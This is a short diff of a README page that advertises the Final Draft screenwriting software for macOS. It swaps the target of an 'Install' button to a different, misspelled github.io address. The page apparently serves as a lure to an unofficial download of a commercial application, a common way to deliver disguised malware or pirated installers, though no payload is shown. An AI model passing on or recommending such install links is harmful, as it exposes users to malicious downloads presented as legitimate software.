@@ -6,7 +6,7 @@
 <h3>Final Draft - industry-standard script writing</h3>
 <p>Final Draft is a professional professional screenwriting software application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/)
 </div>
 <br/><br>
 
